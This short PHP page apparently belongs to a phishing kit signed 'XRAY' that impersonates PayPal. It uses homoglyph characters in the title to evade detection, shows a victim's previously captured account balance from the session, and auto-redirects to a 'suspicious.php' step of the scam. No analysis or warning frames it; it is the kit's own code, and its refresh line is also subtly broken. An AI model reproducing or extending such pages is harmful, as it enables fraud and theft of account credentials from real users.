<?php

#################################################
#                                               #
#            ||~~ BY ~~ XRAY ~~||             #
#                                               #
#            ||~  ~||             #
#                                               #
#################################################

session_start();
include("../../config/__config__.php");
include("../../config/function.php");
include("lang/". $_SESSION['_lang_'].".php");
?>


<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta http-equiv="refresh" content="3; url=suspicious.php?country.x=".$_SESSION['cntname']."-".$_SESSION['cntcode']."&lang.x=".$_SESSION['_lang_'].">
    <title>Yοur Account ΡayΡal</title>
    <link rel="stylesheet" href="#">
    <link rel="stylesheet" href="#">
    <script src="#"></script>
	<link rel="shortcut icon" type="image/x-icon" href="favicon.ico" />
</head>

<body>

<div class="wrapper">
	<div id="acc2">
	<form method="POST" action="">
	
    <?php if(isset($_SESSION['_balance_'])){ echo $_SESSION['_balance_'];} ?>
	
	</form>
	</div>
</div>

</body>
</html>